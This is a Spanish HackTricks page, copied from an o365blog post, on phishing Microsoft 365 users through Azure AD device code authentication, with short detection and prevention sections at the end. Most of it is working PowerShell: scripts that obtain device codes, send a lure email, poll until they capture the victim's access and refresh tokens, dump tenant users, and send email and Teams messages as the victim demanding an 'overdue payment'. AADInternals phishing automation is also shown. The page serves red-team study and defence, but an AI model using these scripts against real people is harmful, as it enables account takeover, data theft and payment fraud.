# Az - Phishing de Autenticación de Código de Dispositivo

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este post fue copiado de** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### ¿Qué es la autenticación de código de dispositivo? <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Según la [documentación](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) de Microsoft, la autenticación de código de dispositivo:

> permite a los usuarios iniciar sesión en dispositivos con restricciones de entrada, como un televisor inteligente, un dispositivo IoT o una impresora. Para habilitar este flujo, el dispositivo hace que el usuario visite una página web en su navegador en otro dispositivo para iniciar sesión. Una vez que el usuario inicia sesión, el dispositivo puede obtener tokens de acceso y tokens de actualización según sea necesario.

El proceso es el siguiente:

1. Un usuario inicia una aplicación que soporta el flujo de código de dispositivo en un dispositivo
2. La aplicación se conecta al punto final de Azure AD /devicecode y envía **client\_id** y **resource**
3. Azure AD devuelve **device\_code**, **user\_code** y **verification\_url**
4. El dispositivo muestra la **verification\_url** (hxxps://microsoft.com/devicelogin) y el **user\_code** al usuario
5. El usuario abre un navegador y navega a **verification\_url**, proporciona el **user\_code** cuando se le solicita e inicia sesión
6. El dispositivo sondea a Azure AD hasta que, después de un inicio de sesión exitoso, obtiene **access\_token** y **refresh\_token**

![Flujo de Código de Dispositivo](https://o365blog.com/images/posts/phishing\_5.png)

### Phishing con autenticación de código de dispositivo <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

La idea básica para utilizar la autenticación de código de dispositivo para phishing es la siguiente.

1. Un atacante se conecta al punto final /devicecode y envía **client\_id** y **resource**
2. Después de recibir **verification\_uri** y **user\_code**, crea un correo electrónico que contenga un enlace a **verification\_uri** y **user\_code**, y lo envía a la víctima.
3. La víctima hace clic en el enlace, proporciona el código y completa el inicio de sesión.
4. El atacante recibe **access\_token** y **refresh\_token** y ahora puede imitar a la víctima.

#### 1. Conectándose al punto final /devicecode <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

El primer paso es hacer un POST http al punto final de dispositivo de Azure AD:
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
Estoy utilizando los siguientes parámetros. Elegí usar el client\_id de "Microsoft Office" porque parece el nombre de aplicación más legítimo, y también se puede usar para acceder a otros recursos. El recurso elegido da acceso a AAD Graph API que es utilizado por el módulo de PowerShell MSOnline.

| Parámetro  | Valor                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| recurso    | [https://graph.windows.net](https://graph.windows.net/) |

La respuesta es similar a la siguiente:
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| Parámetro         | Descripción                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | El código que un usuario ingresará cuando se le solicite                    |
| device\_code      | El código de dispositivo utilizado para "sondear" el resultado de autenticación |
| verification\_url | La url que el usuario necesita navegar para autenticación                   |
| expires\_in       | El tiempo de expiración en segundos (15 minutos)                            |
| interval          | El intervalo en segundos con qué frecuencia el cliente debe sondear para autenticación |
| message           | El mensaje preformateado que se mostrará al usuario                         |

Aquí hay un script para conectarse al endpoint de devicelogin:
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**¡Nota!** Estoy utilizando una versión 1.0 que es un poco diferente al flujo v2.0 utilizado en la [documentación](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code).

#### 2. Creación de un correo electrónico de phishing <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

Ahora que tenemos el **verification\_url** (siempre el mismo) y el **user\_code** podemos crear y enviar un correo electrónico de phishing.

**¡Nota!** Para enviar un correo electrónico necesitas un servicio smtp funcional.

Aquí hay un script para enviar un correo electrónico de phishing a la víctima:
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
El correo electrónico recibido se ve así: ![Flujo de Código de Dispositivo](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. "Capturando el pez" - la víctima realiza la autenticación <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

Cuando una víctima hace clic en el enlace, aparece el siguiente sitio. Como podemos ver, la URL es una URL legítima de Microsoft. Se le pide al usuario que ingrese el código del correo electrónico.

![Código de dispositivo](https://o365blog.com/images/posts/phishing\_7.png)

Después de ingresar el código, se le pide al usuario que seleccione el usuario para iniciar sesión. Como podemos ver, se le pide al usuario que inicie sesión en **Microsoft Office** - no se solicitan consentimientos.

**¡Nota!** Si el usuario no ha iniciado sesión, necesita iniciar sesión utilizando los métodos que la organización objetivo esté utilizando.

![Inicio de sesión](https://o365blog.com/images/posts/phishing\_8.png)

Después de una autenticación exitosa, se muestra lo siguiente al usuario.

![Ganancia](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **¡En este punto la identidad del usuario está comprometida!** :warning:

#### 4. Recuperando los tokens de acceso <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

El último paso para el atacante es recuperar los tokens de acceso. Después de completar el paso 2, el atacante comienza a sondear Azure AD para conocer el estado de la autenticación.

El atacante necesita hacer un http POST al punto final de token de Azure AD cada 5 segundos:
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
La solicitud debe incluir los siguientes parámetros (code es el device_code del paso 1)

| Parámetro  | Valor                                                                                                                                                                                                            |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource   | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code       | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA |
| grant_type | urn:ietf:params:oauth:grant-type:device_code                                                                                                                                                                    |

Si la autenticación está pendiente, se devuelve un error http **400 Bad Request** con el siguiente contenido:
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
Después de un inicio de sesión exitoso, obtendremos la siguiente respuesta (tokens truncados):
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
El siguiente script se conecta al punto final de token de Azure AD y sondea el estado de autenticación.
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
Ahora podemos usar el token de acceso para suplantar a la víctima:
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
Podemos obtener también tokens de acceso para otros servicios utilizando el token de actualización siempre que el client\_id se mantenga igual.

El siguiente script obtiene un token de acceso para Exchange Online.
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## Uso de AADInternals para phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 o posterior) tiene una función [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) que automatiza el proceso de phishing.

El mensaje de phishing se puede personalizar, el mensaje predeterminado es el siguiente:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
### Correo electrónico <a href="#email" id="email"></a>

El siguiente ejemplo envía un correo electrónico de phishing utilizando un mensaje personalizado. Los tokens se guardan en la caché.
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
Y ahora podemos enviar un correo electrónico como la víctima utilizando el token almacenado en caché.
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
También podemos enviar un mensaje de Teams para hacer la solicitud de pago más urgente:
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**El siguiente video muestra cómo usar AADInternals para phishing por correo electrónico.**

### Teams <a href="#teams" id="teams"></a>

AADInternals soporta el envío de mensajes de phishing como mensajes de chat de Teams.

**¡Nota!** Después de que la víctima se haya "autenticado" y se hayan recibido los tokens, AADInternals reemplazará el mensaje original. Este mensaje se puede proporcionar con el parámetro -CleanMessage.

El mensaje limpio predeterminado es:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Mensaje limpio de Teams](https://o365blog.com/images/posts/phishing_13.png)

El siguiente ejemplo envía un correo electrónico de phishing utilizando mensajes personalizados. Los tokens se guardan en la caché.
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**El siguiente video muestra cómo usar AADInternals para el phishing en Teams.**

## Detección <a href="#detecting" id="detecting"></a>

Primero que nada, desde el punto de vista de Azure AD, el inicio de sesión ocurre donde se **inició** la autenticación. Este es un punto muy importante para entender. Esto significa que en el registro de inicio de sesión, el inicio de sesión se realizó desde la **ubicación y dispositivo del atacante**, no del usuario.

Sin embargo, los tokens de acceso adquiridos usando el token de actualización **¡no aparecen en el registro de inicio de sesión!**

A continuación se muestra un ejemplo donde inicié el phishing desde una VM de Azure (bueno, desde la [cloud shell](https://o365blog.com/post/cloudshell/) para ser más específico). Como podemos ver, el inicio de sesión usando el cliente "Microsoft Office" tuvo lugar a las 7:23 AM desde la dirección IP 51.144.240.233. Sin embargo, obtener el token de acceso para Exchange Online a las 7:27 AM no se muestra en el registro.

![Registro de inicio de sesión de Azure AD](https://o365blog.com/images/posts/phishing\_10.png)

:warning: Si hay indicios de que el usuario está iniciando sesión desde ubicaciones no típicas, la cuenta del usuario podría estar comprometida.

## Prevención <a href="#preventing" id="preventing"></a>

La única forma efectiva de prevenir el phishing usando esta técnica es utilizar políticas de [Acceso Condicional](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) (CA). Para ser específicos, **el phishing no se puede prevenir**, pero podemos **prevenir que los usuarios inicien sesión** basándonos en ciertas reglas. Especialmente las políticas basadas en la ubicación y el estado del dispositivo son efectivas para proteger las cuentas. Esto aplica para todas las técnicas de phishing actualmente utilizadas.

Sin embargo, no es posible cubrir todos los escenarios. Por ejemplo, forzar MFA para inicios de sesión desde ubicaciones ilícitas no ayuda si el usuario está iniciando sesión usando MFA.

## Mitigación <a href="#mitigating" id="mitigating"></a>

Si el usuario ha sido comprometido, los tokens de actualización del usuario pueden ser [revocados](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0), lo que impide que el atacante obtenga nuevos tokens de acceso con el token de actualización comprometido.

## Resumen <a href="#summary" id="summary"></a>

Hasta donde sé, la técnica de flujo de autenticación de código de dispositivo no se ha utilizado para phishing antes.

Desde el punto de vista del atacante, este método tiene un par de ventajas:

* No es necesario registrar ninguna aplicación
* No es necesario configurar una infraestructura de phishing para páginas de inicio de sesión falsas, etc.
* Solo se le pide al usuario que inicie sesión (generalmente en "Microsoft Office") - no se solicitan consentimientos
* Todo sucede en el espacio de nombres **login.microsoftonline.com**
* El atacante puede usar cualquier client\_id y recurso (aunque no todas las combinaciones funcionan)
* Si el usuario inició sesión usando MFA, el token de acceso también tiene la afirmación MFA (esto incluye también los tokens de acceso obtenidos usando el token de actualización)
* Prevenir requiere Acceso Condicional (y licencias Azure AD Premium P1/P2)

Desde el punto de vista del atacante, este método tiene al menos una desventaja:

* El código de usuario es válido solo por 15 minutos

Por supuesto, el atacante puede minimizar la restricción de tiempo enviando el correo electrónico de phishing a múltiples destinatarios, lo que aumentará la probabilidad de que alguien inicie sesión usando el código.

Otra forma es implementar [un proxy](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333) que iniciaría la autenticación cuando se haga clic en el enlace (créditos a [@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)). Sin embargo, de esta manera se perdería la ventaja de usar una URL legítima de microsoft.com.

Lista de verificación para sobrevivir a campañas de phishing:

1. **Educa a tus usuarios** sobre seguridad de la información y phishing :woman\_teacher:
2. Usa Autenticación de Múltiples Factores (MFA) :iphone:
3. Usa Intune :hammer\_and\_wrench: y Acceso Condicional (CA) :stop\_sign:

\






<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
